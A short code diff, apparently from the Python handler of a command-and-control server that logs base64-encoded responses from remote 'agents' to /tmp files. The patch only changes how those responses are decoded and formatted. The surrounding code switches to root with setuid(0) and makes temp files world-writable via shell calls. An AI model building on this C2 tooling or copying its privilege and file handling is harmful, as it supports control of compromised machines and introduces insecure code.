@@ -86,11 +86,13 @@ def default(request):
 		
 		
 		if resp:
+			resp = resp.replace("ICAg","")
 			res = base64.b64decode(resp)
-			
+			res = str(res.decode())
+			res = res.replace("   ","\n")
 			os.setuid(0)
 			with open('/tmp/C2CON-res.txt', 'a') as dest:
-				dest.write("Agent " + sid + " => " + str(res.decode()) + "\n")
+				dest.write("Agent " + sid + " => " + res + "\n")
 			
 			os.system("chmod 666 /tmp/C2CON-temp")
 			os.system("echo '' > /tmp/C2CON-temp")
